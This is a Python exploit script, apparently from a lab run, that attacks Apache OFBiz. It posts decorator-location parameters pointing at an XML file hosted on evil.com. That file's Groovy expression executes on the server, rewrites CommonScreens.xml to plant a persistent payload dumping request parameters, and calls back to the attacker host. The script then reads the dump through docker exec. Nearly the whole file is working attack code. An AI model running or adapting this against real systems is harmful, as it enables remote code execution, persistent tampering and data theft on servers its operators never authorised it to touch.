# -*- coding: utf-8 -*-
"""Final round - OFBiz diagnostic #2: fixed parameters dump (String-first concat).
Installs a third actions entry gated on marker pwn_joint_params2, replays the
sister GET, prints the dumped render-time parameters map.
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

WWW = r"D:\Amywork\AgentSelf_Evolve\experiment\multi-round-lab\infrastructure\www\payloads"
TARGET = "https://127.0.0.1:18381"
CB = "http://evil.com:8000/rt/"

OUTER = (
    "def f = new File('/usr/src/apache-ofbiz/framework/webtools/widget/CommonScreens.xml');"
    "def s = f.getText('UTF-8');"
    "def D = (char)34;"
    "def j = s.indexOf('pwn_joint_params');"
    "if (j > 0) "
    "if (s.indexOf('pwn_joint_params2') < 0) "
    "if (s.indexOf('/>', j) > 0) "
    "f.setText(s.substring(0, s.indexOf('/>', j) + 2) "
    "+ '<set value=' + D + '${groovy:' "
    "+ 'new File(' + (char)39 + '/usr/src/apache-ofbiz/pwn_joint_params2' + (char)39 + ').setText(String.valueOf(new java.util.Date()) + ' + (char)39 + ' :: ' + (char)39 + ' + String.valueOf(parameters))' "
    "+ (char)125 + D + '/>' "
    "+ s.substring(s.indexOf('/>', j) + 2), 'UTF-8');"
    "new URL('" + CB + "joint_ofbiz_probe_params2').getText();"
)
OUTER = OUTER.replace("<", "&lt;")

PROBE_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
    '        xmlns="http://ofbiz.apache.org/Widget-Screen" '
    'xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen '
    'http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
    '    <screen name="TemporalExpressionDecorator">\n'
    '        <section>\n'
    '            <actions>\n'
    '                <set value="${groovy:' + OUTER + '}"/>\n'
    '            </actions>\n'
    '        </section>\n'
    '    </screen>\n'
    '</screens>\n')

with open(WWW + r"\joint_probe_params2.xml", "w", encoding="utf-8", newline="\n") as fh:
    fh.write(PROBE_XML)
print("[payload] wrote joint_probe_params2.xml")

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

r = s.post(TARGET + "/webtools/control/main/findTemporalExpression",
           data="tempExprDecoratorLocation=%09http://evil.com:8000/payloads/joint_probe_params2.xml",
           headers={"Content-Type": "application/x-www-form-urlencoded"},
           timeout=90, allow_redirects=False)
print("[*] install probe2 -> HTTP", r.status_code)
time.sleep(2)

r = s.get(TARGET + "/webtools/control/main?mainDecoratorLocation=%09http://evil.com:8000/payloads/joint_sister1.xml",
          timeout=90, allow_redirects=False)
print("[*] replay sister GET -> HTTP", r.status_code, len(r.content), "B")
time.sleep(2)

out = subprocess.run(
    ["docker", "exec", "multi-round-lab-ofbiz-1", "sh", "-c",
     "cat /usr/src/apache-ofbiz/pwn_joint_params2 2>/dev/null | head -c 3000"],
    capture_output=True, text=True, errors="replace")
print("[dump]", (out.stdout + out.stderr).strip()[:3000])
